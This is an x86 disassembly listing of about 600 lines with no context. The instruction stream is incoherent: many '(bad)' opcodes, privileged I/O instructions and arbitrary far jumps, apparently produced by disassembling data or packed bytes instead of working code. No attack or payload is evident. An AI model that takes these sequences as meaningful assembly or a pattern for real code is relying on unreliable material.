  417bdd:	retf   0x12f2
  417be0:	pop    ebx
  417be1:	sbb    esi,edi
  417be3:	shl    BYTE PTR [ebp+0x3],1
  417be6:	push   ebp
  417be7:	rcr    eax,cl
  417be9:	(bad)  
  417beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bec:	pop    eax
  417bed:	sub    al,0x13
  417bef:	pop    ds
  417bf0:	cdq    
  417bf1:	es mov edx,0x9b68bbf2
  417bf7:	sub    edx,edi
  417bf9:	jle    0x417bec
  417bfb:	sti    
  417bfc:	cs dec edi
  417bfe:	popf   
  417bff:	cmc    
  417c00:	pop    eax
  417c01:	jge    0x417b93
  417c03:	adc    BYTE PTR [edx+0x0],bl
  417c06:	(bad)
  417c0a:	int    0x2b
  417c0c:	push   es
  417c0d:	popf   
  417c0e:	jmp    DWORD PTR [esi]
  417c10:	xlat   BYTE PTR ds:[ebx]
  417c11:	cmp    al,0x56
  417c13:	ror    dl,cl
  417c15:	or     DWORD PTR [edi-0x3475847],esp
  417c1b:	fmul   QWORD PTR [ebx-0x5c]
  417c1e:	arpl   WORD PTR [esi],sp
  417c20:	in     eax,dx
  417c21:	dec    esi
  417c22:	mov    edx,DWORD PTR [edx+ebp*1+0x43]
  417c26:	ss popf 
  417c28:	inc    ecx
  417c29:	shl    DWORD PTR [ebp+0x26],cl
  417c2c:	daa    
  417c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c2e:	push   0xaeac6a34
  417c33:	sub    al,0x79
  417c35:	jmp    0x417c1f
  417c37:	sbb    DWORD PTR [edx],edi
  417c39:	xchg   esi,eax
  417c3a:	jecxz  0x417cb4
  417c3c:	dec    edi
  417c3d:	add    dh,BYTE PTR [edx+0x61]
  417c40:	bound  esi,QWORD PTR [edx-0x6e]
  417c43:	pop    esp
  417c44:	ss inc ebx
  417c46:	les    ecx,FWORD PTR [edx+esi*1-0x5cb5c5c2]
  417c4d:	shl    eax,1
  417c4f:	imul   ch
  417c51:	pop    ebx
  417c52:	ins    BYTE PTR es:[edi],dx
  417c53:	ins    DWORD PTR es:[edi],dx
  417c54:	out    dx,eax
  417c55:	loopne 0x417c0f
  417c57:	mov    al,0xb8
  417c59:	xor    BYTE PTR [edi-0x73739792],cl
  417c5f:	mov    WORD PTR [edx],ss
  417c61:	dec    ebx
  417c62:	les    ebx,FWORD PTR [ecx-0x41]
  417c65:	mov    bh,0xc1
  417c67:	rcl    dl,cl
  417c69:	xor    cl,ch
  417c6b:	or     sp,WORD PTR [ebx]
  417c6e:	loop   0x417c9d
  417c70:	pop    ss
  417c71:	out    dx,al
  417c72:	mov    edx,0x3333532e
  417c77:	mov    ah,0xbb
  417c79:	push   ss
  417c7a:	fwait
  417c7b:	pop    ebx
  417c7c:	(bad)  
  417c7e:	pop    esi
  417c7f:	xor    BYTE PTR cs:[edx+edi*1+0x5],0x8
  417c85:	mov    bh,0xc7
  417c88:	enter  0x3264,0xac
  417c8c:	scas   al,BYTE PTR es:[edi]
  417c8d:	lods   eax,DWORD PTR ds:[esi]
  417c8e:	jae    0x417c8b
  417c90:	imul   BYTE PTR [ebp+0x4e]
  417c93:	or     ah,BYTE PTR ds:0x99c72626
  417c99:	call   0x3732:0x489e209c
  417ca0:	aaa    
  417ca1:	dec    ebx
  417ca2:	mov    ecx,0xeee9665c
  417ca7:	adc    dl,BYTE PTR [esi+0xdcb936d]
  417cad:	xchg   ecx,eax
  417cae:	dec    esi
  417caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cb0:	cmp    eax,ebx
  417cb2:	(bad)  [ebp-0x122c50af]
  417cb8:	je     0x417d02
  417cba:	and    al,0x13
  417cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cbd:	rcr    BYTE PTR [ecx],cl
  417cbf:	into   
  417cc0:	popf   
  417cc1:	cmp    ecx,DWORD PTR [edi-0xf]
  417cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cc5:	rol    dh,0xbd
  417cc8:	jne    0x417c96
  417cca:	pop    eax
  417ccb:	pushf  
  417ccc:	push   0xdee364c4
  417cd1:	sbb    bl,bl
  417cd3:	pop    es
  417cd4:	(bad)  
  417cd5:	sbb    BYTE PTR [ecx-0x202a16ec],ch
  417cdb:	ret    0xf2f8
  417cde:	dec    DWORD PTR [esi-0x29]
  417ce1:	jb     0x417c70
  417ce3:	push   edx
  417ce4:	mov    cl,0xf2
  417ce6:	out    0x1f,al
  417ce8:	sbb    al,0x58
  417cea:	aaa    
  417ceb:	into   
  417cec:	jp     0x417caa
  417cee:	sub    BYTE PTR ds:[eax],cl
  417cf1:	arpl   WORD PTR [eax],ax
  417cf3:	(bad)
  417cf7:	stc    
  417cf8:	xor    DWORD PTR [ebp+0x73],eax
  417cfb:	mov    WORD PTR [esi-0x48249cfc],gs
  417d01:	sbb    BYTE PTR [ebp-0x1a15ce01],dh
  417d07:	sbb    ah,cl
  417d09:	jl     0x417c95
  417d0b:	lds    ecx,FWORD PTR [ebx+0x43]
  417d0e:	sbb    BYTE PTR [edx+0x3dc6c6cd],cl
  417d14:	pop    edx
  417d15:	lods   eax,DWORD PTR ds:[esi]
  417d16:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  417d18:	imul   esp,DWORD PTR [edx],0x56ad32c9
  417d1e:	mov    edi,DWORD PTR [edx-0x53]
  417d21:	inc    esi
  417d22:	xor    bl,BYTE PTR [ebp+0x1617e66]
  417d28:	or     DWORD PTR [ecx+0x5d582aaa],eax
  417d2e:	fstp   st(5)
  417d31:	jge    0x417d5d
  417d33:	aad    0xa
  417d35:	mov    edx,0xde3b61a6
  417d3a:	ret    
  417d3b:	lods   al,BYTE PTR ds:[esi]
  417d3d:	dec    esi
  417d3e:	xlat   BYTE PTR ds:[ebx]
  417d3f:	pop    ebx
  417d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d41:	sub    esp,DWORD PTR [edx+0x30]
  417d44:	cmp    dh,BYTE PTR [edx]
  417d46:	mov    ch,BYTE PTR [edx+0x112344aa]
  417d4c:	outs   dx,BYTE PTR ds:[esi]
  417d4d:	fnstsw WORD PTR [ebp+eax*2-0x44b5855b]
  417d54:	frstor [edx+0x61]
  417d57:	popa   
  417d58:	sahf   
  417d59:	or     esp,edi
  417d5b:	push   ss
  417d5c:	sbb    DWORD PTR [esi],ebx
  417d5e:	sbb    DWORD PTR [esi],esp
  417d60:	xchg   ebx,eax
  417d61:	dec    edx
  417d62:	mov    al,0xb7
  417d64:	jg     0x417d2e
  417d66:	cli    
  417d67:	ficomp DWORD PTR [edx]
  417d69:	(bad)  [esi-0x69]
  417d6c:	pop    eax
  417d6d:	sub    al,0xce
  417d6f:	fmul   st(4),st
  417d71:	and    al,0x46
  417d73:	and    al,0x2
  417d75:	cs inc esp
  417d77:	and    eax,DWORD PTR [esi]
  417d79:	mov    bh,0xef
  417d7b:	aam    0xe8
  417d7d:	pop    edx
  417d7e:	ss mov ch,0x46
  417d81:	sbb    eax,0x41009249
  417d86:	mov    ebp,0xad52a756
  417d8b:	loop   0x417d8f
  417d8d:	fstp   DWORD PTR [esi+ecx*1+0x55]
  417d91:	ror    DWORD PTR [eax-0x5b],cl
  417d94:	push   ebx
  417d95:	fdivr  QWORD PTR [edx+0x6b7b8379]
  417d9b:	jmp    0x417dc5
  417d9d:	stos   BYTE PTR es:[edi],al
  417d9e:	ret    0x3f47
  417da1:	cli    
  417da2:	adc    dh,cl
  417da4:	fs xchg edx,eax
  417da6:	xchg   ebx,eax
  417da7:	xchg   ebx,eax
  417da8:	adc    ebx,DWORD PTR [edx-0x5d4df933]
  417dae:	xor    BYTE PTR [ecx],dh
  417db0:	xor    ebp,eax
  417db2:	enter  0x38d8,0xd1
  417db6:	aam    0x10
  417db8:	aaa    
  417db9:	xlat   BYTE PTR ds:[ebx]
  417dba:	mov    dh,0x49
  417dbc:	mov    esi,DWORD PTR [edx]
  417dbe:	adc    ebx,DWORD PTR [edi-0x5]
  417dc1:	jne    0x417d97
  417dc3:	cmc    
  417dc4:	cmp    edi,DWORD PTR [eax]
  417dc6:	adc    cl,al
  417dc8:	xor    al,BYTE PTR [edx+eiz*1-0x1a]
  417dcc:	addr16 mov eax,ds:0xcff5
  417dd0:	iret   
  417dd1:	jp     0x417d8f
  417dd3:	sub    BYTE PTR ds:[eax],cl
  417dd6:	sub    eax,0xbf844780
  417ddb:	jl     0x417e1b
  417ddd:	cmc    
  417dde:	andps  xmm5,XMMWORD PTR [ebx-0x1f5750c7]
  417de5:	retf   0x3460
  417de8:	imul   esp,DWORD PTR [edi+esi*2],0x7e
  417dec:	pop    ss
  417ded:	mov    ecx,0x235c75f0
  417df2:	mov    bh,BYTE PTR [ecx]
  417df4:	jp     0x417d7f
  417df6:	lea    eax,[ebx+0xb8f8e53]
  417dfc:	mov    ah,0x9b
  417dfe:	jne    0x417e32
  417e00:	jmp    0xd2e40839
  417e05:	push   0xffffffb6
  417e07:	enter  0x72e6,0x64
  417e0b:	xor    bl,BYTE PTR [ecx]
  417e0d:	fs pop ecx
  417e0f:	es xchg ebp,eax
  417e11:	dec    esi
  417e12:	adc    ecx,DWORD PTR [ebx+0x3e56be9a]
  417e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e19:	fisubr WORD PTR [eax+0x42323233]
  417e1f:	cmp    bl,BYTE PTR [ebp-0x66ceedde]
  417e25:	cwde   
  417e26:	sbb    BYTE PTR [edi-0x434dd3b0],ah
  417e2c:	mov    edx,0x4552b54a
  417e31:	push   esi
  417e32:	xor    eax,0xbd468084
  417e37:	inc    ecx
  417e38:	cs aaa 
  417e3a:	inc    esp
  417e3b:	and    bl,BYTE PTR [ecx-0x4d52ad60]
  417e41:	mov    ebx,0x6bae87bb
  417e46:	je     0x417e02
  417e48:	push   ss
  417e49:	mov    ch,0x6a
  417e4b:	adc    eax,0xedfd1ef0
  417e50:	mov    eax,0xcdb5b9b0
  417e55:	jmp    0xc949a843
  417e5a:	pop    ebx
  417e5b:	fwait
  417e5c:	mov    al,0xdb
  417e5e:	in     eax,0xdc
  417e60:	mov    ecx,0x71212445
  417e65:	jecxz  0x417e3d
  417e67:	dec    ebp
  417e68:	(bad)  
  417e69:	xlat   BYTE PTR ds:[ebx]
  417e6a:	(bad)  
  417e6b:	push   0xc9323d35
  417e70:	or     eax,0xf3e7c8e5
  417e75:	or     al,0xd
  417e77:	in     eax,0x59
  417e79:	pop    edi
  417e7a:	pop    ebx
  417e7b:	out    0xe4,eax
  417e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e7e:	inc    eax
  417e7f:	xor    al,0x16
  417e81:	and    edx,DWORD PTR [ecx+0x3a38524a]
  417e87:	loop   0x417e77
  417e89:	popf   
  417e8a:	(bad)  [edx+ebx*1]
  417e8d:	dec    ebp
  417e8e:	es addr16 push ss
  417e91:	dec    ecx
  417e92:	push   cs
  417e93:	dec    edi
  417e94:	mov    ds:0xeef61aea,al
  417e99:	sbb    esp,DWORD PTR [esi+ebx*8]
  417e9c:	(bad)  
  417e9d:	adc    eax,0x937e5716
  417ea2:	dec    eax
  417ea3:	icebp  
  417ea4:	or     BYTE PTR [ebx-0x7f],bl
  417ea7:	scas   al,BYTE PTR es:[edi]
  417ea8:	add    ecx,DWORD PTR [esi]
  417eaa:	shr    BYTE PTR [edx-0x6d],1
  417ead:	cld    
  417eae:	sub    edi,0xbe97f179
  417eb4:	hlt    
  417eb5:	(bad)  
  417eb6:	push   esi
  417eb7:	sti    
  417eb8:	lods   al,BYTE PTR ds:[esi]
  417eb9:	(bad)  
  417eba:	in     al,dx
  417ebb:	add    DWORD PTR [eax+0x47802d0],0xfffffff8
  417ec2:	jmp    0xb9908b16
  417ec7:	xchg   ebp,eax
  417ec8:	ret    0x9273
  417ecb:	out    0xbd,al
  417ecd:	push   edi
  417ece:	and    al,0xd0
  417ed0:	loop   0x417f32
  417ed2:	or     edx,DWORD PTR [eax-0x6a]
  417ed5:	fbld   TBYTE PTR [edx]
  417ed7:	mov    dl,0xf1
  417ed9:	push   ss
  417eda:	rcr    BYTE PTR [ebx+0x5f],cl
  417edd:	fs data16 in al,dx
  417ee0:	ret    
  417ee1:	ins    BYTE PTR es:[edi],dx
  417ee2:	imul   ecx,DWORD PTR [edi-0x1f],0xffffff88
  417ee6:	xor    al,0xd1
  417ee8:	in     al,dx
  417ee9:	adc    al,0x66
  417eeb:	jp     0x417e79
  417eed:	fdivr  st(0),st
  417eef:	add    al,0xc9
  417ef1:	js     0x417e77
  417ef3:	lods   eax,DWORD PTR ds:[esi]
  417ef4:	in     eax,dx
  417ef5:	sub    eax,0x640b8e4e
  417efa:	xchg   DWORD PTR [edx+0x7e],esi
  417efd:	(bad)  
  417efe:	fisub  WORD PTR [esi+ebx*2-0x3283b50d]
  417f05:	mov    BYTE PTR [edi-0x399e5800],dh
  417f0b:	enter  0x1324,0xdc
  417f0f:	mov    esp,0x9dbd877d
  417f14:	pop    ebp
  417f15:	test   BYTE PTR [ecx+edx*4],ah
  417f18:	pop    ds
  417f19:	sbb    ah,dl
  417f1b:	(bad)
  417f1f:	push   ebx
  417f20:	fisub  WORD PTR [ebx-0x68911343]
  417f26:	scas   eax,DWORD PTR es:[edi]
  417f27:	mov    esi,0xd3e516f5
  417f2c:	adc    cl,BYTE PTR [ebp-0x60187cba]
  417f32:	mov    ebp,0x67d9fc4e
  417f37:	imul   esi,DWORD PTR [ebx+ebx*8],0xdc73e48c
  417f3e:	mov    esp,0xe5959773
  417f43:	gs ins BYTE PTR es:[edi],dx
  417f45:	xlat   BYTE PTR ds:[ebx]
  417f46:	and    DWORD PTR [ecx],edx
  417f48:	dec    edi
  417f49:	xor    BYTE PTR [edi],dh
  417f4b:	cmp    ecx,DWORD PTR [ebp-0x2c]
  417f4e:	(bad)  
  417f4f:	adc    edx,esp
  417f51:	jmp    0x3657:0xa2858a0d
  417f58:	fsub   st(5),st
  417f5a:	loop   0x417f96
  417f5c:	push   eax
  417f5d:	lods   eax,DWORD PTR ds:[esi]
  417f5e:	push   esi
  417f5f:	test   eax,0x3668569c
  417f64:	call   0x332e:0x18c4f8c
  417f6b:	mov    bl,0x73
  417f6d:	and    BYTE PTR [ecx],ch
  417f6f:	lods   al,BYTE PTR ds:[esi]
  417f70:	mov    esp,0xd3529777
  417f75:	and    eax,0xb5284aea
  417f7a:	or     eax,0x25fe37ac
  417f7f:	repnz fnstsw WORD PTR [edi+0x4d]
  417f83:	bound  edi,QWORD PTR [edi-0x77]
  417f86:	pop    eax
  417f87:	or     ebx,DWORD PTR [edx-0x23f293fe]
  417f8d:	mov    ss,edi
  417f8f:	daa    
  417f90:	inc    edx
  417f91:	add    bh,BYTE PTR [edx-0x5a5c3633]
  417f97:	mov    ebx,0x77bf022f
  417f9c:	xchg   BYTE PTR [ebx-0xa],al
  417f9f:	add    DWORD PTR [ecx+0x48],0x8a008f00
  417fa6:	mov    al,0x5f
  417fa8:	push   eax
  417fa9:	pop    esp
  417faa:	cmp    ebp,ebp
  417fac:	pop    ss
  417fad:	(bad)
  417fb0:	mov    al,ds:0xde0fde28
  417fb5:	xchg   ebp,eax
  417fb6:	inc    ecx
  417fb7:	sub    BYTE PTR [eax],ah
  417fb9:	jbe    0x417f92
  417fbb:	sbb    DWORD PTR ds:0x1758675a,edi
  417fc1:	fdivr  DWORD PTR [ecx+0x27ca9469]
  417fc7:	push   0x488f3e8f
  417fcc:	pop    ebp
  417fcd:	inc    esi
  417fce:	retf   
  417fcf:	pop    edi
  417fd0:	mov    eax,ds:0x69d1c98d
  417fd5:	xchg   DWORD PTR [edx-0x55],ebp
  417fd8:	inc    eax
  417fd9:	xor    dl,BYTE PTR [ebp-0x585a3d19]
  417fdf:	mov    BYTE PTR [edi],ah
  417fe1:	mov    dh,0x18
  417fe3:	retf   0x28e6
  417fe6:	xchg   edi,eax
  417fe7:	sub    ebp,esp
  417fe9:	in     al,dx
  417fea:	outs   dx,BYTE PTR ds:[esi]
  417feb:	shr    DWORD PTR [edx+0x75],cl
  417fee:	cwde   
  417fef:	fwait
  417ff0:	fwait
  417ff1:	inc    edi
  417ff2:	xlat   BYTE PTR ds:[ebx]
  417ff3:	jne    0x418057
  417ff5:	icebp  
  417ff6:	mov    eax,0x5c0ec0f7
  417ffb:	sbb    cl,ch
  417ffd:	lods   eax,DWORD PTR ss:[esi]
  417fff:	jbe    0x41801c
  418001:	(bad)  
  418002:	mov    dh,0x71
  418004:	add    DWORD PTR [ecx-0x6f],ebx
  418007:	add    DWORD PTR [ecx-0x51d1ffc0],eax
  41800d:	jmp    0x417ff1
  41800f:	cmp    dh,BYTE PTR [esi]
  418011:	mov    dh,0x63
  418013:	and    ecx,DWORD PTR [ebx+0x12]
  418016:	mov    dl,0x2c
  418018:	adc    ecx,edx
  41801a:	and    edi,DWORD PTR [eax+0x49c9cbae]
  418020:	mov    ebp,ebp
  418022:	in     eax,dx
  418023:	pop    ebp
  418024:	stos   BYTE PTR es:[edi],al
  418025:	aad    0x1a
  418027:	inc    esi
  418028:	les    esp,FWORD PTR [eax+0x66]
  41802b:	jbe    0x417fc7
  41802d:	jb     0x417fd8
  41802f:	int3   
  418030:	test   DWORD PTR [ebx-0x242227e9],ecx
  418036:	in     eax,0xe6
  418038:	int    0x5b
  41803a:	aam    0x9a
  41803c:	ins    DWORD PTR es:[edi],dx
  41803d:	scas   al,BYTE PTR es:[edi]
  41803e:	pop    esp
  41803f:	jg     0x417fdf
  418041:	lds    ecx,FWORD PTR [ebx+0x2c911197]
  418047:	inc    esi
  418048:	inc    esp
  418049:	shr    DWORD PTR [edx],0x6d
  41804c:	xor    edx,DWORD PTR [ebp+edi*2-0x65]
  418050:	jmp    0xb687ae37
  418055:	out    dx,al
  418056:	mov    ds:0xab906f1c,al
  41805b:	jbe    0x4180cd
  41805d:	xor    BYTE PTR [esi-0x2ef8b900],0x5
  418064:	and    DWORD PTR [eax-0x6f],eax
  418067:	mov    eax,ds:0x28c4f96b
  41806c:	and    ebx,DWORD PTR [edi+edx*2]
  41806f:	std    
  418070:	sbb    BYTE PTR [ecx],ah
  418072:	add    DWORD PTR [edx+edx*1],edi
  418075:	mov    BYTE PTR [ebx+0x20f81be],dh
  41807b:	jle    0x418063
  41807d:	jns    0x418062
  41807f:	push   edi
  418080:	shr    BYTE PTR [edx-0x15],cl
  418083:	aas    
  418084:	push   edi
  418085:	adc    al,0xd0
  418087:	adc    eax,0xa7483430
  41808c:	inc    ecx
  41808d:	push   edx
  41808e:	inc    eax
  41808f:	xchg   esi,eax
  418090:	inc    eax
  418091:	push   edi
  418092:	cmp    eax,0x419657ff
  418097:	mov    eax,0xcba03b20
  41809c:	and    BYTE PTR [ecx-0x2bae64a0],ch
  4180a2:	cld    
  4180a3:	or     al,0xf5
  4180a5:	clc    
  4180a6:	sbb    al,0x5
  4180a8:	jne    0x418034
  4180aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180ab:	cmp    ebp,eax
  4180ad:	hlt    
  4180ae:	shr    DWORD PTR [edi+0x51cfcf11],cl
  4180b4:	ins    DWORD PTR es:[edi],dx
  4180b5:	sub    esp,esp
  4180b7:	repz sub DWORD PTR [edx-0x1b],ecx
  4180bb:	es jg  0x4180ba
  4180be:	aad    0xaf
  4180c0:	push   edx
  4180c1:	lods   eax,DWORD PTR ds:[esi]
  4180c2:	aad    0x39
  4180c4:	mov    edi,0xd70bc0b8
  4180c9:	das    
  4180ca:	jno    0x418144
  4180cc:	pop    eax
  4180cd:	inc    esp
  4180ce:	push   ebx
  4180cf:	adc    eax,0xe6e15574
  4180d4:	in     eax,dx
  4180d5:	fistp  DWORD PTR [esp+ebp*8]
  4180d8:	in     eax,dx
  4180d9:	xchg   edx,eax
  4180da:	dec    esp
  4180db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180dc:	jns    0x4180d8
  4180de:	test   eax,0x760210a7
  4180e3:	div    esi
  4180e5:	cdq    
  4180e6:	popf   
  4180e7:	sahf   
  4180e8:	mov    ds:0xe773ab52,al
  4180ed:	scas   al,BYTE PTR es:[edi]
  4180ee:	neg    DWORD PTR [eax+0x458585b1]
  4180f4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180f7:	cmp    BYTE PTR [esi],ch
  4180f9:	pushf  
  4180fa:	adc    BYTE PTR [ecx],dh
  4180fc:	and    esp,DWORD PTR [edx+eiz*8]
  4180ff:	or     esi,ebx
  418101:	jl     0x4180fe
  418103:	pop    ebp
  418104:	ss mov bh,0x77
  418107:	mov    DWORD PTR [eax-0x2702a1cf],ebx
  41810d:	(bad)  
  41810e:	mov    BYTE PTR [eax],bl
  418110:	xor    al,BYTE PTR [edi-0x6dcf57b]
  418116:	add    al,0x9b
  418118:	sbb    edi,DWORD PTR [ebx+0x7c]
  41811b:	jecxz  0x41816c
  41811d:	(bad)  
  41811e:	adc    bl,al
  418120:	test   eax,0x60cc7170
  418125:	pop    eax
  418126:	cmp    DWORD PTR [ebp-0x5dea0b4e],esp
  41812c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41812d:	ja     0x41817f
  41812f:	mov    bh,BYTE PTR [ebx]
  418131:	sub    BYTE PTR [ebp+0x3a1b4e32],cl
  418137:	push   ss
  418138:	je     0x418196
  41813a:	test   al,0x77
  41813c:	cmp    eax,0xb01c73f2
  418141:	ins    BYTE PTR es:[edi],dx
  418142:	push   0x8363a076
  418147:	in     eax,0x40
  418149:	mov    ebx,0x776fbdeb
  41814e:	loope  0x418108
  418150:	retf   0x5b0d
  418153:	xlat   BYTE PTR ds:[ebx]
  418154:	scas   al,BYTE PTR es:[edi]
  418155:	std    
  418156:	std    
  418157:	mov    bh,0x3b
  418159:	neg    BYTE PTR [ecx-0x71]
  41815c:	fstp   QWORD PTR [edi+0x74]
  41815f:	test   BYTE PTR [esi],dl
  418161:	rol    BYTE PTR [ebx-0x3a],0xff
  418165:	jo     0x4181ac
  418167:	dec    ebp
  418168:	mov    ch,BYTE PTR [esi-0x5]
  41816b:	push   ebp
  41816c:	fld    DWORD PTR [eax]
  41816e:	dec    ecx
  41816f:	add    bl,cl
  418171:	xlat   BYTE PTR ds:[ebx]
  418172:	js     0x4181bc
  418174:	loopne 0x418180
  418176:	dec    edi
  418177:	add    ebx,edx
  418179:	mov    ?,WORD PTR [edi-0x4db7fb6b]
  41817f:	out    0x1a,eax
  418181:	pop    eax
  418182:	mov    dh,BYTE PTR [edi-0x54]
  418185:	aam    0xac
  418187:	ret    
  418188:	(bad)  
  418189:	sub    eax,0x5916e2e2
  41818e:	sbb    eax,0x9df60684
  418193:	cmp    BYTE PTR [esi+0x2c],ch
  418196:	and    DWORD PTR [ecx-0x5c],0xffffffe9
  41819a:	mov    ds,WORD PTR [esi+0x44]
  41819d:	(bad)  
  41819e:	dec    esi
  41819f:	mov    al,0x58
  4181a1:	outs   dx,BYTE PTR ds:[esi]
  4181a2:	push   ebx
  4181a3:	push   0x47
  4181a5:	dec    eax
  4181a6:	xchg   edi,eax
  4181a7:	dec    ebx
  4181a8:	je     0x4181a1
  4181aa:	stos   BYTE PTR es:[edi],al
  4181ab:	rcl    BYTE PTR [eax-0x6f],1
  4181ae:	loop   0x4181c9
  4181b0:	je     0x4181e5
  4181b2:	mov    ebp,ebp
  4181b4:	je     0x41819f
  4181b6:	mov    edx,0x1746d512
  4181bb:	cmp    eax,0x55d7409a
  4181c0:	repnz inc edx
  4181c2:	daa    
  4181c3:	sahf   
  4181c4:	mov    ss,ecx
  4181c6:	inc    edx
  4181c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181c8:	(bad)  
  4181c9:	xchg   BYTE PTR [esi-0x7d7a4fdb],ah
  4181cf:	sbb    DWORD PTR [ebp+0x51456f10],ecx
  4181d5:	gs pop es
  4181d7:	fldcw  WORD PTR [edx]
  4181d9:	mov    eax,ds:0x74498fb6
  4181de:	test   DWORD PTR [eax+0x77],0x295a41c
  4181e5:	popf   
  4181e6:	jmp    0x5cae:0x6e1da21
  4181ed:	and    BYTE PTR [edi-0x14286881],bh
  4181f3:	cmp    ebx,DWORD PTR [eax]
  4181f5:	lods   eax,DWORD PTR ds:[esi]
  4181f6:	sbb    cl,dl
  4181f8:	jp     0x418207
  4181fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181fb:	add    DWORD PTR [ecx],ebp
  4181fd:	leave  
  4181fe:	imul   ecx,DWORD PTR [edi-0x2165871b],0x52
  418205:	rol    DWORD PTR [edx],0x1c
  418208:	fcmovnbe st,st(3)
  41820a:	lock xchg esi,eax
  41820c:	or     eax,0x8111eb8
  418211:	loope  0x4181c8
  418213:	rol    esi,1
  418215:	outs   dx,DWORD PTR ds:[esi]
  418216:	stos   DWORD PTR es:[edi],eax
  418217:	out    dx,eax
  418218:	push   es
  418219:	push   0x9d18bcb2
  41821e:	sahf   
  41821f:	mov    esi,0xef2bdbcc
  418224:	sahf   
  418225:	in     eax,dx
  418226:	call   0x48894828
  41822b:	add    BYTE PTR [edi],cl
  41822d:	sbb    ebx,edx
  41822f:	iret   
  418230:	pop    esp
  418231:	mov    eax,0x7375beda
  418236:	fcmovb st,st(5)
  418238:	sti    
  418239:	sar    DWORD PTR [ebx-0x28329bfe],1
  41823f:	idiv   BYTE PTR [eax+0x51]
  418242:	pop    eax
  418243:	pop    ecx
  418244:	repnz test BYTE PTR [ecx-0x243dfdb9],ah
  41824b:	daa    
  41824c:	stc    
  41824d:	lahf   
  41824e:	mov    ebx,0x3a091c02
  418253:	adc    cl,BYTE PTR [eax+0x36]
  418256:	enter  0x154e,0xb9
  41825a:	pop    ebp
  41825b:	inc    ebp
  41825c:	adc    eax,0xeffb09b
  418261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418262:	add    al,0x97
  418264:	jmp    0x418204
  418266:	das    
  418267:	ins    DWORD PTR es:[edi],dx
  418268:	fild   WORD PTR [edi+eiz*8]
  41826b:	call   DWORD PTR [ecx+0x48]
  41826e:	push   0x4d47206
  418273:	and    eax,edx
  418275:	adc    eax,0x259ce5db
  41827a:	and    DWORD PTR [edi-0x5e],eax
  41827d:	test   al,0x7b
  41827f:	imul   ebx,DWORD PTR [ecx+ecx*2],0x745b6223
  418286:	mov    ds:0xc3ab6626,eax
  41828b:	inc    edi
  41828c:	sbb    edx,DWORD PTR [ebp+0x5c]
  41828f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418290:	dec    ebx
  418291:	hlt    
  418292:	pop    eax
  418293:	ret    0x13fe
  418296:	or     esp,DWORD PTR [ebx+0x3611435e]
  41829c:	mov    dl,0xdc
  41829e:	in     eax,0xd9
  4182a0:	push   esi
  4182a1:	sbb    eax,0xd1144d3a
  4182a6:	sar    DWORD PTR [ebp-0xb6fa7f5],0x3c
  4182ad:	pop    es
  4182ae:	and    al,dl
  4182b0:	mov    bl,0x62
  4182b2:	ins    BYTE PTR es:[edi],dx
  4182b3:	or     DWORD PTR [eax*1+0xb2c1444],ebx
  4182ba:	pop    esp
  4182bb:	retf   
  4182bc:	fwait
  4182bd:	jae    0x4182df
  4182bf:	and    al,0x10
  4182c1:	mov    dh,0xd7
  4182c3:	push   ss
  4182c4:	loope  0x418340
  4182c6:	in     eax,dx
  4182c7:	in     al,dx
  4182c8:	pop    edx
  4182c9:	js     0x41825a
  4182cb:	sbb    edx,DWORD PTR [ebp-0x1c490844]
  4182d1:	mov    ch,0xd7
  4182d3:	lds    esp,FWORD PTR [ebx]
  4182d5:	or     BYTE PTR [ebp+0x6],al
  4182d8:	add    eax,0x2fb810db
  4182dd:	add    esp,DWORD PTR [ecx]
  4182df:	add    DWORD PTR [esp+eiz*2],edi
  4182e2:	test   BYTE PTR [eax+esi*8],al
  4182e5:	nop
  4182e6:	push   ecx
  4182e7:	(bad)  
  4182e9:	sti    
  4182ea:	mov    ah,0xae
  4182ec:	mov    eax,0x64d00842
  4182f1:	dec    edi
  4182f2:	shr    DWORD PTR [ecx-0x6df9b876],cl
  4182f8:	add    al,0x48
  4182fa:	jge    0x41827d
  4182fc:	pop    es
  4182fd:	dec    edi
  4182fe:	jo     0x4182f0
  418300:	mov    ch,0xa1
  418302:	jmp    0x4182e6
  418304:	dec    ecx
  418305:	xchg   BYTE PTR [edx+edx*4],al
  418308:	jmp    0x4182c7
  41830a:	test   BYTE PTR [eax],al
  41830c:	and    DWORD PTR [ebx+0x1f],edi
  41830f:	mov    ebx,0xb03f1792
  418314:	pop    ebp
  418315:	das    
  418316:	mov    cl,BYTE PTR [esi-0x4fd0e21d]
  41831c:	push   eax
  41831d:	in     eax,dx
  41831e:	sbb    dh,BYTE PTR [edx+ebp*2]
  418321:	mov    eax,0x9832182e
  418326:	xchg   edx,eax
  418327:	outs   dx,DWORD PTR ds:[esi]
  418328:	pop    ebp
  418329:	in     al,dx
  41832a:	jp     0x418303
  41832c:	xor    eax,0x305cb054
  418331:	add    eax,0xc37702c4
  418336:	icebp  
  418337:	mov    esi,0x1a7aaa3f
  41833c:	pop    ebx
  41833d:	enter  0xbde,0xc9
  418341:	sti    
  418342:	(bad)
  418348:	scas   al,BYTE PTR es:[edi]
  418349:	in     eax,dx
  41834a:	frstor [edi+0x7d66f83]
  418350:	mov    bh,0xea
  418352:	imul   esi,DWORD PTR [ecx+eiz*8-0x41],0x5c
  418357:	cmp    al,0x41
  418359:	ja     0x41837f
  41835b:	iret   
  41835c:	adc    eax,0x402b7c90
  418361:	push   ss
  418362:	sahf   
  418363:	pop    ebx
